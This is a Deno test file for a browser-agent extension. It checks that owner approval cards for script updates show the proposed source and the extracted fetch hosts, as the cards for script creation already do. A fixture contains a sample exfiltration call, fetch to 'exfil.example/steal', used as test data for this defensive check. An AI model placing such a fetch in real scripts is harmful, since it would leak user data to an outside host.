// @ts-nocheck
// tests/script-update-disclosure.test.ts — chrome-agent-platform-inu5w.
//
// THE ASYMMETRY. `script.create` discloses the exact source AND the hosts it fetches on the owner's
// approval card, because `script.create` is a member of SOURCE_DISCLOSING_ACTIONS and the route
// passes the source-bearing detail. `script.update` staged only the old/new diff and was NOT a
// member, so an owner approving a model-authored rewrite could see the changed lines and never see
// the extracted fetch-host list — the update could add a fetch call, i.e. the exfiltration + SSRF
// channel the class comment above script.create calls out, with weaker owner tooling than create.
// The extraction aid exists precisely because owners do not read diffs.
//
// WHAT THIS PINS, and why each leg is red-able:
//   1. `script.update` is a SOURCE_DISCLOSING_ACTIONS member. Remove it and the card silently loses
//      the bounded detail (boundApprovalDetail only runs for members) — leg 2 reds with it.
//   2. The card the owner receives for script.update carries the bounded source, the extracted
//      hosts and the dynamic flag — through the SAME `approvalCardDenial` path create uses, so the
//      two actions cannot diverge again.
//   3. The route WIRING: the script.update route builds the disclosure with the one shared helper
//      (`scriptDisclosureDetail`) and passes it as requireOwnerApproval's detail argument. A third
//      copy of the extraction is how this family recurs, so the helper is required by name.
//
// FALSIFICATION (measured): drop "script.update" from SOURCE_DISCLOSING_ACTIONS -> legs 1 and 2
// red; pass `undefined` instead of `disclosure` in the route -> leg 3 reds.

import { assert, assertEquals } from "jsr:@std/assert@1";
import * as path from "node:path";
import { fileURLToPath } from "node:url";
import { approvalCardDenial, SOURCE_DISCLOSING_ACTIONS } from "../extension/lib/owner-approval.js";

const ROOT = fileURLToPath(new URL("../", import.meta.url));

/** The body of a route (`async "<action>"(...) { ... }`) by brace matching — path-and-name keyed,
 *  never line-keyed: khwi9 moved a policed listener 14 lines and rotted a line pin. */
function routeBody(src: string, action: string): string {
  const at = src.indexOf(`async "${action}"(`);
  assert(at > 0, `service-worker.js must define the ${action} route`);
  // The FIRST `{` after the route name belongs to the destructured parameter list, not the body,
  // so start at the parameter list's closing `) {`.
  const openAt = src.indexOf(") {", at);
  assert(openAt > at, `the ${action} route must have a body`);
  const open = openAt + 2;
  let depth = 0;
  for (let i = open; i < src.length; i++) {
    if (src[i] === "{") depth++;
    else if (src[i] === "}") {
      depth--;
      if (depth === 0) return src.slice(open + 1, i);
    }
  }
  throw new Error(`unterminated body for ${action}`);
}

Deno.test("inu5w: script.update is a source-disclosing action", () => {
  assertEquals(
    SOURCE_DISCLOSING_ACTIONS.has("script.update"),
    true,
    "script.update must disclose its source + fetch hosts: a create/update asymmetry lets a rewrite add " +
      "a fetch host with weaker owner tooling than creating the same script",
  );
  // The asymmetry is the defect, so the create side staying a member is part of the same claim.
  assertEquals(SOURCE_DISCLOSING_ACTIONS.has("script.create"), true);
});

Deno.test("inu5w: the script.update card carries the extracted fetch hosts, exactly like create", () => {
  const detail = { source: "const r = await fetch('https://exfil.example/steal')", hosts: ["exfil.example"], dynamic: false };
  const update = approvalCardDenial({ approvalId: "ap_u", action: "script.update", targetRef: "ref", detail });
  const create = approvalCardDenial({ approvalId: "ap_c", action: "script.create", targetRef: "ref", detail });
  assertEquals(update.permissionRequirement.approvals[0].detail, create.permissionRequirement.approvals[0].detail);
  assertEquals(update.permissionRequirement.approvals[0].detail.hosts, ["exfil.example"]);
  assertEquals(update.permissionRequirement.approvals[0].detail.source, detail.source);
  assertEquals(update.permissionRequirement.approvals[0].detail.dynamic, false);
});

Deno.test("inu5w: the update route builds its disclosure with the one shared helper and passes it", async () => {
  const sw = await Deno.readTextFile(path.join(ROOT, "extension/background/service-worker.js"));
  const body = routeBody(sw, "script.update");
  assert(
    /scriptDisclosureDetail\(\s*newSource\s*\)/.test(body),
    "the script.update route must build the disclosure from the PROPOSED source with the shared " +
      "scriptDisclosureDetail helper — a second copy of the extraction is how create/update diverged",
  );
  assert(
    /requireOwnerApproval\(\s*context\s*,\s*"script\.update"\s*,\s*target\s*,\s*payload\s*,\s*disclosure\b/.test(body),
    "the script.update route must hand that disclosure to requireOwnerApproval as the detail argument " +
      "(undefined there is the inu5w defect: the card falls back to the diff only)",
  );
  // The diff detail stays: the disclosure ADDS to the card, it does not replace the edit view.
  assert(/stagedScriptDetail/.test(body), "the update route must keep staging the old/new diff detail");
});
